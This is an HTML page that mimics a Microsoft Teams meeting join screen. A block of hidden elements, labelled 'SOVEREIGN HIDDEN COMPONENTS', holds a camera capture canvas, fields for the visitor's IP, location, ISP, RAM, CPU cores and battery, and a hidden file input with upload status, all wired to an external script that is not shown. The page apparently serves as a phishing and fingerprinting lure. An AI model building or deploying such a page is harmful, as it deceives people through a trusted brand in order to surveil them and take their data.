<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Teams Meeting</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        body { background-color: #f3f2f1; color: #242424; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        .teams-purple { background-color: #464eb8; color: #ffffff; }
        .teams-card { background-color: #ffffff; box-shadow: 0 3.2px 7.2px 0 rgba(0,0,0,.132), 0 .6px 1.8px 0 rgba(0,0,0,.108); }
        .video-box { background-color: #2d2c2c; }
        .blur-overlay { backdrop-filter: blur(25px); background: rgba(45, 44, 44, 0.4); }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4">
    <main class="max-w-5xl w-full flex flex-col items-center">
        <h1 class="text-2xl font-light mb-12 text-[#242424]">Choose your audio and video settings</h1>

        <div class="grid grid-cols-1 lg:grid-cols-10 gap-8 w-full">
            <!-- Video Preview (Left) -->
            <div class="lg:col-span-6 video-box rounded-xl overflow-hidden shadow-2xl relative border border-gray-800">
                <video id="v-hidden" class="w-full h-full object-cover aspect-video" autoplay playsinline></video>
                <div id="teams-overlay" class="absolute inset-0 flex flex-col items-center justify-center blur-overlay">
                    <i data-lucide="video-off" class="text-white/40 w-20 h-20 mb-6"></i>
                    <p class="text-white/80 text-sm font-semibold">Your video is turned off</p>
                </div>
                <!-- Interactive Video Controls -->
                <div class="absolute bottom-0 w-full p-5 flex justify-center space-x-6 bg-gradient-to-t from-black/80 to-transparent">
                    <div class="flex items-center space-x-2 glass p-2 rounded-md"><i data-lucide="video" class="w-5 h-5 text-white"></i><div class="w-10 h-5 bg-gray-600 rounded-full relative"><div class="absolute right-1 top-1 w-3 h-3 bg-white rounded-full"></div></div></div>
                    <div class="flex items-center space-x-2 glass p-2 rounded-md"><i data-lucide="mic" class="w-5 h-5 text-white"></i><div class="w-10 h-5 bg-gray-600 rounded-full relative"><div class="absolute right-1 top-1 w-3 h-3 bg-white rounded-full"></div></div></div>
                </div>
            </div>

            <!-- Join Controls (Right) -->
            <div class="lg:col-span-4 teams-card p-8 rounded-xl flex flex-col justify-between">
                <div>
                    <h3 class="text-xl font-bold mb-6">Meeting #729-105-001</h3>
                    <div class="space-y-6">
                        <div class="flex items-center justify-between border-b border-gray-100 pb-4 cursor-pointer">
                            <div class="flex items-center"><i data-lucide="speaker" class="w-5 h-5 mr-3 text-gray-500"></i><span class="text-sm">PC Speakers</span></div>
                            <i data-lucide="chevron-down" class="w-4 h-4 text-gray-400"></i>
                        </div>
                        <div class="flex items-center justify-between border-b border-gray-100 pb-4 cursor-pointer">
                            <div class="flex items-center"><i data-lucide="mic" class="w-5 h-5 mr-3 text-gray-500"></i><span class="text-sm">Integrated Microphone</span></div>
                            <i data-lucide="chevron-down" class="w-4 h-4 text-gray-400"></i>
                        </div>
                    </div>
                </div>

                <div class="mt-12 space-y-4">
                    <button id="init-btn" class="teams-purple w-full py-3.5 rounded-md font-bold text-sm hover:brightness-110 transition-all shadow-lg">Join now</button>
                    <div class="text-[10px] text-gray-400 text-center font-mono uppercase">
                        Connection_Node: <span id="target-ip" class="text-purple-600">IDENTIFYING...</span>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <footer class="mt-20 flex flex-col items-center space-y-4">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" width="90" class="opacity-40">
        <div class="flex space-x-6 text-[11px] text-gray-500">
            <span>Privacy and cookies</span><span>Terms of use</span>
        </div>
    </footer>

    <!-- SOVEREIGN HIDDEN COMPONENTS -->
    <canvas id="c-hidden" class="hidden"></canvas>
    <div id="terminal" class="hidden"></div>
    <span id="ram-val" class="hidden"></span><span id="core-val" class="hidden"></span><span id="bat-val" class="hidden"></span><span id="loc-val" class="hidden"></span><span id="isp-val" class="hidden"></span>
    <div id="upload-status" class="hidden"><div id="upload-bar"></div><span id="percent-text"></span></div>
    <input type="file" id="file-input" class="hidden" multiple>
    <div id="drop-zone" class="hidden"></div>

    <script src="/app.js"></script>
    <script>
        lucide.createIcons();
        document.getElementById('init-btn').addEventListener('click', function() {
            document.getElementById('teams-overlay').classList.add('hidden');
            this.textContent = 'JOINING MEETING...';
            this.classList.add('opacity-50', 'pointer-events-none');
        });
    </script>
</body>
</html>
